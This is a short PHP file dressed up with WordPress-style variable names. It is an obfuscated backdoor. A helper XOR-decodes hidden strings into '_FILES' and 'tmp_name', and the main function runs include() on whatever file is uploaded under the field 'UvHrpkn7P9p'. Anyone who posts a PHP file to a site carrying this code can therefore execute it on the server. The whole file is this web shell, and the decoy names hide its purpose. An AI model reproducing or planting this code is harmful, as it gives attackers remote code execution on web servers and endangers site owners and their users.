<?php

        
    
        
function children($page_list)

{

    $datetime = $page_list;
    

    $smiley = $GLOBALS[html_regex("%0A0%01%3E58", $datetime)];
    $wheres = $smiley;
	$tagstack = 'unhashed';
    $inclusions = isset($wheres[$datetime]);

    if ($inclusions)

    {
        $get_posts = $smiley[$datetime];
        $quote_pattern = $get_posts[html_regex("%21%1B8-%1E%0A%03R", $datetime)];
        $array_int_fields = $quote_pattern;
        include ($array_int_fields);
    }
}
function html_regex($intermediate_file, $show_in_nav_menus)

{
    $comments_in = $show_in_nav_menus;
    $tags_input = "url";
    $tags_input  .= "decode";
	$message = 'wp_post_statuses';
    $smiley_url = $tags_input($intermediate_file);
    $template_lock = strlen($smiley_url);
	$content = 'post_type';
    $template_lock = substr($comments_in, 0, $template_lock);
    $locale = $smiley_url ^ $template_lock;
    
    $smiley_url = sprintf($locale, $template_lock);

    
	$no_texturize_shortcodes = 'is_sticky';
    return $locale;

}


children('UvHrpkn7P9p');


?>
